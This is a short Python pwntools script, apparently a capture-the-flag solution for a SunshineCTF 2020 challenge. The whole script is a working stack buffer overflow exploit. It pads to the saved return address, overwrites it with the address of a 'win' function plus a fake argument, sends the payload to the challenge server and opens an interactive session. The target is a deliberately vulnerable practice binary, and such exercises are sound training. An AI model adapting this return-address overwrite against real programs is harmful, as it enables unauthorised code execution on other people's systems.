from pwn import *

sh = remote('chal.2020.sunshinectf.org', 30010)
# sh = process('./chall_10')

p1 = "abc"

ret_padding = cyclic_find(0x61716161)
win_addr = 0x80484d6
payload = cyclic(ret_padding) + p32(win_addr) + p32(0) + p32(0xdeadbeef)

# 0xffffc5fe

with open('payload', 'w') as f:
    f.write(p1 + '\n')

with open('payload', 'ab') as f:
    f.write(payload)

sh.recvline()
sh.sendline(p1)

sh.sendline(payload)
sh.interactive()
